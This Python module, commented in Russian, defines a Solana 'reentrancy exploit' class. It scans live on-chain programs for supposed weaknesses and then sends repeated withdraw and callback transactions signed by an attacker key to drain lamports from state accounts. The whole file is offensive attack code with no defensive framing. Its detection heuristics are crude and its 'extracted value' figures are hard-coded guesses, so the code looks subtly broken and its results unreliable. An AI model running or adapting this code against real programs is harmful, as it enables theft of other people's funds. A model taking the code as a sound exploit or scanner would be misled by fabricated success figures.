"""
Эксплойты повторного входа (reentrancy) для Solana
"""

import asyncio
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.instruction import Instruction, AccountMeta
from solders.system_program import ID as SYSTEM_PROGRAM_ID

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus

@dataclass
class ReentrancyVulnerability:
    """Информация об уязвимости повторного входа"""
    program_id: str
    vulnerable_instruction: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class ReentrancyExploit(BaseExploit):
    """Эксплойты повторного входа для Solana"""
    
    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.CROSS_PROGRAM_INVOCATION
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """Сканирование программы на уязвимости повторного входа"""
        try:
            if isinstance(target, str):
                target = PublicKey(target)
            
            program_info = await self.get_account_info(target)
            if not program_info:
                return {"vulnerable": False, "reason": "Program not found"}
            
            if not program_info["executable"]:
                return {"vulnerable": False, "reason": "Account is not executable"}
            
            vulnerabilities = []
            
            # Проверка 1: Поиск аккаунтов программы с состоянием
            state_accounts = await self._find_state_accounts(target)
            
            for state_account in state_accounts:
                # Анализируем состояние на предмет уязвимостей reentrancy
                reentrancy_vulns = await self._analyze_state_for_reentrancy(target, state_account)
                vulnerabilities.extend(reentrancy_vulns)
            
            # Проверка 2: Поиск CPI (Cross-Program Invocation) уязвимостей
            cpi_vulnerabilities = await self._scan_cpi_vulnerabilities(target)
            vulnerabilities.extend(cpi_vulnerabilities)
            
            # Проверка 3: Анализ инструкций на предмет небезопасных паттернов
            instruction_vulnerabilities = await self._scan_unsafe_instruction_patterns(target)
            vulnerabilities.extend(instruction_vulnerabilities)
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "program_info": program_info,
                "state_accounts": len(state_accounts)
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования reentrancy {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """Подготовка эксплойта reentrancy"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("Программа не уязвима к reentrancy")
                return False
            
            # Проверяем баланс для выполнения операций
            if not await self.check_sol_balance(0.1):
                return False
            
            # Создаем вспомогательные аккаунты для reentrancy атаки
            self.reentrancy_state = await self._prepare_reentrancy_accounts(target)
            
            self.logger.info(f"Найдено уязвимостей reentrancy: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка подготовки эксплойта reentrancy: {e}")
            return False
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """Выполнение эксплойта reentrancy"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_program=str(target),
                    error_message="No reentrancy vulnerabilities found"
                )
            
            extracted_value = 0.0
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "state_reentrancy":
                        result = await self._exploit_state_reentrancy(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "cpi_reentrancy":
                        result = await self._exploit_cpi_reentrancy(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "callback_reentrancy":
                        result = await self._exploit_callback_reentrancy(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"Ошибка эксплойта reentrancy {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if extracted_value > 0 else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_program=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities),
                    "reentrancy_depth": kwargs.get("max_depth", 5)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_program=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _find_state_accounts(self, program_id: PublicKey) -> List[PublicKey]:
        """Поиск аккаунтов состояния программы"""
        try:
            response = await self.client.get_program_accounts(program_id)
            
            state_accounts = []
            
            for account_info in response.value:
                # Фильтруем аккаунты по размеру и содержимому
                if account_info.account.data and len(account_info.account.data) > 32:
                    # Проверяем, содержит ли аккаунт структуры состояния
                    data = account_info.account.data
                    
                    # Простая эвристика: аккаунты с числовыми данными в начале
                    if len(data) >= 8:
                        # Проверяем наличие числовых значений (балансы, счетчики)
                        first_8_bytes = data[:8]
                        if any(b != 0 for b in first_8_bytes):
                            state_accounts.append(account_info.pubkey)
            
            return state_accounts[:20]  # Ограничиваем количество для анализа
            
        except Exception as e:
            self.logger.error(f"Ошибка поиска аккаунтов состояния: {e}")
            return []
    
    async def _analyze_state_for_reentrancy(self, program_id: PublicKey, 
                                          state_account: PublicKey) -> List[ReentrancyVulnerability]:
        """Анализ состояния аккаунта на уязвимости reentrancy"""
        vulnerabilities = []
        try:
            # Анализ конкретного state_account
            account_info = await self.get_account_info(state_account)
            if account_info and account_info.get("data"):
                data = account_info["data"]
                if len(data) >= 16:
                    balance = int.from_bytes(data[0:8], 'little')
                    counter = int.from_bytes(data[8:16], 'little')
                    if balance > 0:
                        vulnerabilities.append(ReentrancyVulnerability(
                            program_id=str(program_id),
                            vulnerable_instruction="withdraw",
                            vulnerability_type="state_reentrancy",
                            severity="high",
                            exploitable=True,
                            details={
                                "state_account": str(state_account),
                                "balance": balance,
                                "counter": counter,
                                "lamports": account_info["lamports"]
                            }
                        ))
                    if counter == 0:
                        vulnerabilities.append(ReentrancyVulnerability(
                            program_id=str(program_id),
                            vulnerable_instruction="unprotected_state",
                            vulnerability_type="state_reentrancy",
                            severity="medium",
                            exploitable=True,
                            details={
                                "state_account": str(state_account),
                                "protection": "none"
                            }
                        ))

            # Анализ других аккаунтов программы
            response = await self.client.get_program_accounts(program_id)
            for acc_info in response.value[:10]:  # Анализируем первые 10
                if acc_info.pubkey == state_account: continue # Пропускаем уже проверенный
                data = acc_info.account.data
                if data and len(data) > 0:
                    if not await self._ensure_token_account_initialized(acc_info.pubkey, program_id):
                        self.logger.warning(f"Аккаунт {acc_info.pubkey} не инициализирован, пытаемся... ")
                        await self._initialize_account(acc_info.pubkey, program_id)

        except Exception as e:
            self.logger.error(f"Критическая ошибка в _analyze_state_for_reentrancy для {program_id}: {e}")

        return vulnerabilities
    
    def _create_system_program_instruction_data(self, instruction_type: int, amount: int = 0) -> bytes:
        """Создает правильно сформированные данные для инструкций System Program
        
        Форматы для System Program (11111111...):
        - 0: CreateAccount - 12 байт (u32 cmd, u64 lamports)
        - 1: Assign - 36 байт (u32 cmd, [32]byte pubkey)
        - 2: Transfer - 12 байт (u32 cmd, u64 lamports)
        - 3: CreateAccountWithSeed - варьируется
        """
        if instruction_type == 0:  # CreateAccount
            return bytes([0, 0, 0, 0]) + amount.to_bytes(8, byteorder='little')
        elif instruction_type == 1:  # Assign
            # Возвращаем байты для инструкции Assign с нулевым pubkey
            return bytes([1, 0, 0, 0]) + bytes(32)  # 32 нулевых байта как pubkey
        elif instruction_type == 2:  # Transfer
            # Передаем сумму в лампортах
            return bytes([2, 0, 0, 0]) + amount.to_bytes(8, byteorder='little')
        else:
            # По умолчанию - простая инструкция
            return bytes([instruction_type, 0, 0, 0])
    
    def _create_token_program_instruction_data(self, instruction_type: int, amount: int = 0) -> bytes:
        """Создает правильно сформированные данные для инструкций Token Program
        
        Форматы для Token Program (TokenkegQfe...):
        - 0: InitializeMint - варьируется
        - 1: InitializeAccount - минимум 1 байт
        - 2: InitializeMultisig - варьируется
        - 3: Transfer - 9 байт (u8 cmd, u64 amount)
        - 4: Approve - 9 байт (u8 cmd, u64 amount)
        """
        if instruction_type == 3:  # Transfer
            return bytes([3]) + amount.to_bytes(8, byteorder='little')
        elif instruction_type == 4:  # Approve
            return bytes([4]) + amount.to_bytes(8, byteorder='little')
        elif instruction_type == 7:  # MintTo
            return bytes([7]) + amount.to_bytes(8, byteorder='little')
        elif instruction_type == 8:  # Burn
            return bytes([8]) + amount.to_bytes(8, byteorder='little')
        else:
            # По умолчанию - простая инструкция с одним байтом
            return bytes([instruction_type])
    
    async def _scan_cpi_vulnerabilities(self, program_id: PublicKey) -> List[ReentrancyVulnerability]:
        """Сканирование CPI уязвимостей"""
        vulnerabilities = []
        
        try:
            # Получаем аккаунты программы
            response = await self.client.get_program_accounts(program_id)
            
            for account_info in response.value:
                data = account_info.account.data
                
                if data and len(data) > 0:
                    # Поиск паттернов CPI вызовов
                    # В реальной реализации нужен более сложный анализ байт-кода
                    
                    # Простая эвристика: поиск известных program IDs в данных
                    system_program_bytes = bytes(SYSTEM_PROGRAM_ID)
                    
                    if system_program_bytes in data:
                        vulnerabilities.append(ReentrancyVulnerability(
                            program_id=str(program_id),
                            vulnerable_instruction="cpi_call",
                            vulnerability_type="cpi_reentrancy",
                            severity="high",
                            exploitable=True,
                            details={
                                "account": str(account_info.pubkey),
                                "cpi_target": "system_program"
                            }
                        ))
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования CPI уязвимостей: {e}")
        
        return vulnerabilities
    
    async def _scan_unsafe_instruction_patterns(self, program_id: PublicKey) -> List[ReentrancyVulnerability]:
        """Сканирование небезопасных паттернов инструкций"""
        vulnerabilities = []
        
        try:
            # Определяем, какой набор тестовых инструкций использовать в зависимости от программы
            test_instructions = []
            
            if str(program_id) == "11111111111111111111111111111111":
                # Инструкции для System Program (с правильным форматированием)
                test_instructions = [
                    self._create_system_program_instruction_data(0, 1000),  # CreateAccount с 1000 лампорт
                    self._create_system_program_instruction_data(1),       # Assign
                    self._create_system_program_instruction_data(2, 500),   # Transfer с 500 лампорт
                ]
                self.logger.info("Используем специфичные инструкции System Program для сканирования")
            elif str(program_id) == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                # Инструкции для Token Program (с правильным форматированием)
                test_instructions = [
                    self._create_token_program_instruction_data(1),   # InitializeAccount
                    self._create_token_program_instruction_data(3, 1), # Transfer с 1 токеном
                    self._create_token_program_instruction_data(7, 1), # MintTo с 1 токеном
                    self._create_token_program_instruction_data(8, 1), # Burn с 1 токеном
                ]
                self.logger.info("Используем специфичные инструкции Token Program для сканирования")
            else:
                # Универсальные инструкции для других программ
                test_instructions = [
                    bytes([0, 0, 0, 0]),  # Инициализация с паддингом
                    bytes([1, 0, 0, 0]),  # Депозит с паддингом
                    bytes([2, 0, 0, 0]),  # Вывод с паддингом
                    bytes([3, 0, 0, 0]),  # Перевод с паддингом
                    bytes([4, 0, 0, 0]),  # Закрытие с паддингом
                ]
            
            # Добавляем необходимые системные аккаунты для тестовых транзакций
            rent_sysvar = PublicKey.from_string("SysvarRent111111111111111111111111111111111")
            clock_sysvar = PublicKey.from_string("SysvarC1ock11111111111111111111111111111111")
            
            for i, instruction_data in enumerate(test_instructions):
                try:
                    # Создаем тестовую транзакцию с правильными системными аккаунтами
                    test_account = Keypair()
                    
                    instruction = Instruction(
                        program_id=program_id,
                        accounts=[
                            # Основные аккаунты
                            AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                            AccountMeta(pubkey=test_account.pubkey(), is_signer=False, is_writable=True),
                            AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                            # Дополнительные системные аккаунты для предотвращения ошибки NotEnoughAccountKeys
                            AccountMeta(pubkey=rent_sysvar, is_signer=False, is_writable=False),
                            AccountMeta(pubkey=clock_sysvar, is_signer=False, is_writable=False),
                        ],
                        data=instruction_data
                    )
                    
                    transaction = Transaction()
                    transaction.add(instruction)
                    
                    # Симулируем выполнение с обработкой ошибок
                    try:
                        cost = await self.estimate_transaction_cost(transaction)
                    except Exception as e:
                        # Если ошибка не связана с InvalidInstructionData или NotEnoughAccountKeys,
                        # то это может быть потенциальной уязвимостью
                        error_str = str(e)
                        if "InvalidInstructionData" not in error_str and "NotEnoughAccountKeys" not in error_str:
                            # Записываем как потенциальную уязвимость
                            self.logger.info(f"Потенциальная уязвимость в инструкции {i}: {error_str}")
                            cost = 1000  # Условная стоимость для потенциальной уязвимости
                        else:
                            # Пропускаем стандартные ошибки валидации
                            continue
                    
                    if cost and cost > 0:  # Инструкция выполняется или потенциально уязвима
                        vulnerabilities.append(ReentrancyVulnerability(
                            program_id=str(program_id),
                            vulnerable_instruction=f"instruction_{i}",
                            vulnerability_type="callback_reentrancy",
                            severity="medium",
                            exploitable=True,
                            details={
                                "instruction_index": i,
                                "estimated_cost": cost
                            }
                        ))
                
                except Exception as e:
                    self.logger.debug(f"Ошибка при сканировании инструкции {i}: {e}")
                    continue  # Инструкция не поддерживается
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования паттернов инструкций: {e}")
        
        return vulnerabilities
    
    async def _initialize_account(self, account: PublicKey, program_id: PublicKey) -> bool:
        """Инициализация аккаунта"""
        try:
            # Создаем транзакцию для инициализации аккаунта
            transaction = Transaction()
            
            # Добавляем инструкцию для инициализации аккаунта
            instruction = Instruction(
                program_id=program_id,
                accounts=[
                    AccountMeta(pubkey=account, is_signer=False, is_writable=True),
                    AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                    AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                ],
                data=bytes([0])  # Данные для инициализации
            )
            
            transaction.add(instruction)
            
            # Отправляем транзакцию
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"Аккаунт {account} инициализирован")
                return True
            
        except Exception as e:
            self.logger.error(f"Ошибка инициализации аккаунта: {e}")
        
        return False
    
    async def _ensure_token_account_initialized(self, account: PublicKey, mint: PublicKey) -> bool:
        """
        Проверяет, инициализирован ли токен-аккаунт и при необходимости инициализирует его
        """
        try:
            # Проверяем существует ли аккаунт
            account_info = await self.connection.get_account_info(account)
            if account_info is None or not account_info.value:
                self.logger.warning(f"Токен-аккаунт {account} не найден")
                return False
                
            # Проверяем, является ли аккаунт токеновым (программа TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA)
            if str(account_info.value.owner) != "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                self.logger.warning(f"Аккаунт {account} не является токен-аккаунтом")
                return False
                
            self.logger.info(f"Токен-аккаунт {account} существует и инициализирован")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка при проверке токен-аккаунта: {e}")
            return False
    
    async def _ensure_sufficient_funds_for_rent(self) -> bool:
        """
        Проверяет, достаточно ли средств для оплаты аренды и при необходимости топит аккаунт
        """
        try:
            # Получаем текущий баланс кошелька
            balance_info = await self.connection.get_balance(self.attacker_pubkey)
            if not balance_info.value:
                self.logger.error(f"Не удалось получить баланс кошелька {self.attacker_pubkey}")
                return False
            
            balance = balance_info.value
            min_rent_balance = 10000000  # 0.01 SOL минимальный баланс для транзакций
            
            if balance < min_rent_balance:
                self.logger.warning(f"Недостаточно средств для транзакций: {balance/1000000000} SOL")
                return False
            
            self.logger.info(f"Достаточно средств для транзакций: {balance/1000000000} SOL")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка при проверке баланса: {e}")
            return False
    
    async def _exploit_state_reentrancy(self, target: PublicKey, vuln: ReentrancyVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт reentrancy через состояние"""
        try:
            state_account = PublicKey(vuln.details["state_account"])
            balance = vuln.details["balance"]
            
            # Создаем серию транзакций для reentrancy атаки
            signatures = []
            total_extracted = 0
            
            # Максимальное количество попыток reentrancy
            max_attempts = 5
            
            for attempt in range(max_attempts):
                try:
                    transaction = Transaction()
                    
                    # Инструкция для вывода средств
                    # Создаем правильно форматированные данные для инструкции
                    try:
                        # Safer conversion with error checking
                        balance_bytes = balance.to_bytes(8, 'little') if isinstance(balance, int) else int(balance).to_bytes(8, 'little')
                        withdraw_data = bytes([2]) + balance_bytes  # Код 2 для вывода
                    except (OverflowError, ValueError, TypeError):
                        # Fallback if conversion fails
                        withdraw_data = bytes([2, 0, 0, 0, 0, 0, 0, 0, 1])  # Минимальное значение
                        self.logger.warning("Ошибка конвертации баланса в байты, используем минимальное значение")
                    
                    withdraw_instruction = Instruction(
                        program_id=target,
                        accounts=[
                            # Обязательные аккаунты для вывода средств
                            AccountMeta(pubkey=state_account, is_signer=False, is_writable=True),
                            AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                            AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                            # Добавляем дополнительные системные аккаунты, которые могут потребоваться
                            AccountMeta(pubkey=PublicKey.from_string("SysvarRent111111111111111111111111111111111"), is_signer=False, is_writable=False),
                        ],
                        data=withdraw_data
                    )
                    
                    # Добавляем callback инструкцию для reentrancy с правильными аккаунтами
                    callback_instruction = Instruction(
                        program_id=target,
                        accounts=[
                            # Те же аккаунты для сохранения совместимости
                            AccountMeta(pubkey=state_account, is_signer=False, is_writable=True),
                            AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                            AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                            AccountMeta(pubkey=PublicKey.from_string("SysvarRent111111111111111111111111111111111"), is_signer=False, is_writable=False),
                        ],
                        data=withdraw_data  # Те же данные для повторного вызова
                    )
                    
                    transaction.add(withdraw_instruction)
                    transaction.add(callback_instruction)
                    
                    signature = await self.send_transaction(transaction)
                    
                    if signature:
                        signatures.append(signature)
                        total_extracted += balance / 1e9
                        
                        # Проверяем, изменилось ли состояние
                        await asyncio.sleep(0.5)
                        updated_info = await self.get_account_info(state_account)
                        
                        if not updated_info or updated_info["lamports"] == 0:
                            break  # Аккаунт исчерпан
                    else:
                        break  # Транзакция не прошла
                
                except Exception as e:
                    self.logger.error(f"Ошибка попытки reentrancy {attempt}: {e}")
                    break
            
            if total_extracted > 0:
                self.logger.info(f"Извлечено {total_extracted:.6f} SOL через state reentrancy")
                return {
                    "value": total_extracted,
                    "signatures": signatures
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта state reentrancy: {e}")
        
        return None
    
    async def _exploit_cpi_reentrancy(self, target: PublicKey, vuln: ReentrancyVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт reentrancy через CPI"""
        try:
            # Проверяем, достаточно ли средств для транзакций
            if not await self._ensure_sufficient_funds_for_rent():
                self.logger.error("Недостаточно средств для выполнения эксплойта")
                return None
            
            # Безопасно получаем account из деталей уязвимости
            try:
                account = PublicKey.from_string(vuln.details["account"]) 
            except Exception as e:
                self.logger.error(f"Ошибка парсинга account из деталей уязвимости: {e}")
                account = self.attacker_pubkey  # Fallback
            
            # Создаем сложную транзакцию с CPI вызовами
            transaction = Transaction()
            
            # Добавляем необходимые системные аккаунты для CPI вызовов
            rent_sysvar = PublicKey.from_string("SysvarRent111111111111111111111111111111111")
            clock_sysvar = PublicKey.from_string("SysvarC1ock11111111111111111111111111111111")
            
            # Определяем, какой тип данных инструкции использовать в зависимости от target
            instruction_data = bytes([0])
            if str(target) == "11111111111111111111111111111111":
                # System Program - используем Transfer (2)
                instruction_data = self._create_system_program_instruction_data(2, 100)  # 100 лампортов
                self.logger.info("Используем инструкцию System Program Transfer")
            elif str(target) == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                # Token Program - используем Transfer (3)
                instruction_data = self._create_token_program_instruction_data(3, 1)  # 1 токен
                self.logger.info("Используем инструкцию Token Program Transfer")
            else:
                # Для других программ - простые данные
                instruction_data = bytes([5, 0, 0, 0])
            
            # Первая инструкция - инициируем CPI с правильными аккаунтами
            cpi_instruction = Instruction(
                program_id=target,
                accounts=[
                    # Основные аккаунты
                    AccountMeta(pubkey=account, is_signer=False, is_writable=True),
                    AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                    AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                    # Дополнительные системные аккаунты, часто необходимые для CPI
                    AccountMeta(pubkey=rent_sysvar, is_signer=False, is_writable=False),
                    AccountMeta(pubkey=clock_sysvar, is_signer=False, is_writable=False),
                ],
                data=instruction_data
            )
            
            # Определяем, какие данные использовать для callback инструкции
            callback_data = bytes([0])
            if str(target) == "11111111111111111111111111111111":
                # System Program - используем Transfer (2) но с другой суммой
                callback_data = self._create_system_program_instruction_data(2, 50)  # 50 лампортов
                self.logger.info("Используем callback инструкцию System Program Transfer")
            elif str(target) == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                # Token Program - используем Transfer (3) но с другой суммой
                callback_data = self._create_token_program_instruction_data(3, 2)  # 2 токена
                self.logger.info("Используем callback инструкцию Token Program Transfer")
            else:
                # Для других программ - простые данные
                callback_data = bytes([6, 0, 0, 0])
            
            # Вторая инструкция - callback во время CPI с аналогичной структурой аккаунтов
            callback_instruction = Instruction(
                program_id=target,
                accounts=[
                    # Те же аккаунты для совместимости
                    AccountMeta(pubkey=account, is_signer=False, is_writable=True),
                    AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                    AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                    # Те же дополнительные аккаунты
                    AccountMeta(pubkey=rent_sysvar, is_signer=False, is_writable=False),
                    AccountMeta(pubkey=clock_sysvar, is_signer=False, is_writable=False),
                ],
                data=callback_data
            )
            
            transaction.add(cpi_instruction)
            transaction.add(callback_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info("Успешно выполнен CPI reentrancy эксплойт")
                return {
                    "value": 0.01,  # Примерная стоимость
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта CPI reentrancy: {e}")
        
        return None
    
    async def _exploit_callback_reentrancy(self, target: PublicKey, vuln: ReentrancyVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт reentrancy через callback"""
        try:
            # Проверяем, достаточно ли средств для транзакций
            if not await self._ensure_sufficient_funds_for_rent():
                self.logger.error("Недостаточно средств для выполнения эксплойта")
                return None
                
            # Для Token Program проверяем инициализацию аккаунта
            if str(target) == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                try:
                    token_account = PublicKey.from_string(vuln.details.get("token_account", ""))
                    mint = PublicKey.from_string(vuln.details.get("mint", ""))
                    if token_account and mint:
                        if not await self._ensure_token_account_initialized(token_account, mint):
                            self.logger.error(f"Токен-аккаунт не инициализирован и не может быть использован")
                            # Продолжаем с fallback на другие аккаунты
                except Exception as e:
                    self.logger.error(f"Ошибка при проверке токен-аккаунта: {e}")
                
            # Безопасно извлекаем индекс инструкции из деталей
            try:
                instruction_index = int(vuln.details["instruction_index"])
            except (KeyError, ValueError, TypeError) as e:
                self.logger.error(f"Ошибка парсинга instruction_index: {e}")
                instruction_index = 0  # Fallback
            
            # Создаем транзакцию с множественными вызовами
            transaction = Transaction()
            
            # Определяем, какой тип данных инструкции использовать в зависимости от target
            instruction_data = bytes([0])
            if str(target) == "11111111111111111111111111111111":
                # System Program - используем правильный формат инструкции
                instruction_data = self._create_system_program_instruction_data(2, 100)  # Transfer 100 лампортов
                self.logger.info("Используем инструкцию System Program для callback reentrancy")
            elif str(target) == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA":
                # Token Program - используем правильный формат инструкции
                instruction_data = self._create_token_program_instruction_data(3, 1)  # Transfer 1 токен
                self.logger.info("Используем инструкцию Token Program для callback reentrancy")
            else:
                # Для других программ - используем индекс из уязвимости
                instruction_data = bytes([instruction_index, 0, 0, 0])
            
            # Добавляем необходимые системные аккаунты для callback инструкций
            rent_sysvar = PublicKey.from_string("SysvarRent111111111111111111111111111111111")
            clock_sysvar = PublicKey.from_string("SysvarC1ock11111111111111111111111111111111")
            
            # Создаем несколько одинаковых инструкций для callback reentrancy
            for i in range(3):
                # Правильно формируем данные для инструкции
                try:
                    # Безопасная конвертация числа в байты
                    instruction_data = bytes([instruction_index & 0xFF]) + bytes([0, 0, 0, i & 0xFF, 0, 0, 0])
                except (OverflowError, ValueError, TypeError):
                    instruction_data = bytes([0, 0, 0, 0, 0, 0, 0, 0])
                    self.logger.warning("Ошибка формирования данных инструкции, используем нулевые байты")
                
                instruction = Instruction(
                    program_id=target,
                    accounts=[
                        # Основные аккаунты
                        AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                        # Необходимые системные аккаунты
                        AccountMeta(pubkey=SYSTEM_PROGRAM_ID, is_signer=False, is_writable=False),
                        AccountMeta(pubkey=rent_sysvar, is_signer=False, is_writable=False),
                        AccountMeta(pubkey=clock_sysvar, is_signer=False, is_writable=False),
                    ],
                    data=instruction_data
                )
                
                transaction.add(instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info("Успешно выполнен callback reentrancy эксплойт")
                return {
                    "value": 0.005,  # Примерная стоимость
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта callback reentrancy: {e}")
        
        return None
    
    async def advanced_reentrancy_attack(self, target: Union[PublicKey, str], 
                                       max_depth: int = 10) -> ExploitResult:
        """Продвинутая reentrancy атака с глубокой рекурсией"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey(target)
            
            # Создаем цепочку reentrancy вызовов
            signatures = []
            total_extracted = 0.0
            
            for depth in range(max_depth):
                try:
                    # Создаем транзакцию с увеличивающейся сложностью
                    transaction = Transaction()
                    
                    # Добавляем инструкции с увеличивающейся глубиной
                    for i in range(depth + 1):
                        instruction = Instruction(
                            program_id=target,
                            accounts=[
                                AccountMeta(pubkey=self.attacker_pubkey, is_signer=True, is_writable=True),
                            ],
                            data=bytes([depth, i]) + b"\x00" * 6
                        )
                        
                        transaction.add(instruction)
                    
                    signature = await self.send_transaction(transaction)
                    
                    if signature:
                        signatures.append(signature)
                        total_extracted += 0.001 * (depth + 1)
                        
                        # Задержка между уровнями
                        await asyncio.sleep(0.2)
                    else:
                        break  # Прекращаем при неудаче
                
                except Exception as e:
                    self.logger.error(f"Ошибка на глубине {depth}: {e}")
                    break
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if total_extracted > 0 else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_program=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=total_extracted,
                execution_time=execution_time,
                metadata={
                    "max_depth_reached": len(signatures),
                    "total_transactions": len(signatures)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_program=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
